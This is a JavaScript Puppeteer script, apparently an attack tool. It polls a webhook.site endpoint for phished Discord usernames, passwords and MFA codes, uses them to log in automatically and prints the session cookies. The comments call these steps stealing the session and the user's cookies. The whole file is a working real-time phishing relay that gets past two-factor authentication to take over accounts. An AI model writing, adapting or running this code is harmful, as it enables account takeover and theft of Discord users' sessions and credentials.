import puppeteer from 'puppeteer'
import axios from 'axios';
const tokenId = 'ef17691a-2922-4756-a80a-61c9463c43ea';
const URL = `https://webhook.site/token/${tokenId}/request/latest/raw`;

const browser = await puppeteer.launch({
  headless: false, // let us see what's happening
  defaultViewport: null, // allow resizing
});

let loginData;
let previousLogin;

// Searches for new requests and creates a new login session if found
const stealSession = async () => {
  console.log('searching for new login');
  loginData = await getData();

  // checks if request is new or equivalent to previous
  if (JSON.stringify(loginData) !== JSON.stringify(previousLogin)) {
    createLoginSession();
  }
  previousLogin = loginData;
}

// Creates a get request to webhook.site, returns most recent body data
const getData = async () => {
  try {
    const response = await axios.get(URL, {
      headers: {
        'Accept': 'application/json',
      }
    });

    return response.data;
  } catch (error) {
    console.log(error);
  }
}

// Creates new discord login tab and automatically logs in with provided information
const createLoginSession = async () => {
  const page = await browser.newPage();
  try {
    await page.goto('https://discord.com/login');
    console.log("Loaded initial page");
    
    // filling out login details
    await page.locator('input[name=email]').fill(loginData.username);
    await page.locator('input[name=password]').fill(loginData.password);
    await page.locator('button[type=submit]').click();
    
    // filling out mfa
    if (loginData.mfa !== undefined) {
      await page.locator('input[placeholder="6-digit authentication code"]').fill(loginData.mfa);
      await page.locator('button[type=submit]').click();
    }
    
    // waits for app to load
    await page.waitForSelector('div[class=app_a01fb1]');
    
    // steal user cookies
    const cookies = await page.cookies();
    console.log(cookies);

    console.log(loginData);

  } catch (error) {
    console.log(error);
    page.close();
  }
}

// Sets 5 second loop for session stealing process
setInterval(() => {
  stealSession();
}, 5000);